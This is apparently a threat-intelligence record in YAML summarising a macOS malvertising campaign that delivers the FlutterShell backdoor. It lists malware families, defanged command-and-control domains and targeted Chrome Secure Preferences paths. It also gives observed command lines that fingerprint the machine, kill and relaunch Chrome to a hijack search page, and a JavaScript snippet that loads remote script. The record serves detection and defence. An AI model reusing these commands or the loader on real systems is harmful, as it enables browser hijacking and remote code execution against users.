title: 'Operation FlutterBridge: macOS Malvertising Campaign Delivering FlutterShell
  Backdoor'
description: FlutterShell is a macOS backdoor distributed through malvertising campaigns
  by the CL-CRI-1089 cluster, using Flutter-based applications masquerading as legitimate
  software to hijack browsers and execute arbitrary shell commands via a JavaScript-to-native
  bridge. The campaign is linked to Windows adware strains RecipeLister and Calendaromatic
  and its predecessor JSCoreRunner.
attribution: CL-CRI-1089
malware_families:
- FlutterShell
- JSCoreRunner
- FileRipple
- RecipeLister
- Calendaromatic
- Podcasts Lounge
- PDF-Brain
- PDF-Ninja
cves: []
ttps:
  processes:
  - ioreg
  - sed
  - killall
  - Google Chrome
  - open
  - podcasts_lounge
  - sh
  command_lines:
  - ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | sed 's/.*"IOPlatformUUID"
    = "//; s/"//g'
  - killall "Google Chrome"
  - Google Chrome "hxxps[:]//sinterfumesco[.]com/search?utn=[Tracking Data]=&q=starttt"
    --restore-last-session --hide-crash-restore-bubble --noerrdialogs --disable-session-crashed-bubble
  - dart:io exit()
  - /bin/sh -c ioreg -rd1 -c IOPlatformExpertDevice | grep IOPlatformUUID | sed 's/.*"IOPlatformUUID"
    = "//; s/"//g'
  - /bin/sh -c "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome" "https://sinterfumesco[.]com/search?utn=[REDACTED]=&q=starttt"
    --restore-last-session --hide-crash-restore-bubble --noerrdialogs --disable-session-crashed-bubble
  powershell: []
  scripts:
  - 'function loadConfig() {

    console.log(''Loading config.js...'');

    // Create and append script element

    const script = document.createElement(''script'');

    script.src = ''/getUpdateThanksConfig'';

    script.onload = function() {

    console.log(''configAbout.js loaded successfully'');

    if (btn) {

    btn.textContent = ''ConfigUpdate-Thanks.js Loaded'';

    }}

    script.onerror = function() {

    console.error(''Failed to load configUpdate-Thanks.js'');

    if (btn) {

    btn.disabled = false;

    btn.textContent = ''Load ConfigUpdate-Thanks.js (Retry)'';

    }}

    document.body.appendChild(script);

    }

    loadConfig();'
  registry_keys: []
  image_loads: []
  network_connections:
  - FlutterShell -> atsheisdomestic[.]org
  - FlutterShell -> etoftheappyrince[.]org
  - FlutterShell -> healightejustb[.]org
  - FlutterShell -> sinterfumesco[.]com
  - FlutterShell -> atsheisdomestic[.]org/api/update-delay
  - FlutterShell -> atsheisdomestic[.]org/update-thanks.html
  - FlutterShell -> etoftheappyrince[.]org/update-delay
  - FlutterShell -> healightejustb[.]org/checkupdateTO.js
  - podcasts_lounge -> atsheisdomestic[.]org
  - podcasts_lounge -> etoftheappyrince[.]org
  - podcasts_lounge -> healightejustb[.]org
  - podcasts_lounge -> sinterfumesco[.]com
  file_activity:
  - Google Chrome Secure Preferences file
  - $HOME/Library/Caches/com.app.[appname]/org.sparkle-project.Sparkle/Installation/
  - /Users/$USER$/Library/Application Support/Google/Chrome/Profile 1/Secure Preferences
  - /Users/$USER$/Library/Application Support/Google/Chrome/Default/Secure Preferences
  - /Users/$USERS$/Library/Application Support/Google/Chrome/Profile 2/Secure Preferences
  persistence:
  - FlutterShell uses the Sparkle software update framework to silently swap the malware
    binary by programmatically executing the open command on a staged app bundle in
    the Sparkle cache directory, bypassing user interaction
  - Browser hijack via modification of Chrome Secure Preferences to change default
    search provider to sinterfumesco[.]com
  process_relations:
  - podcasts_lounge -> sh
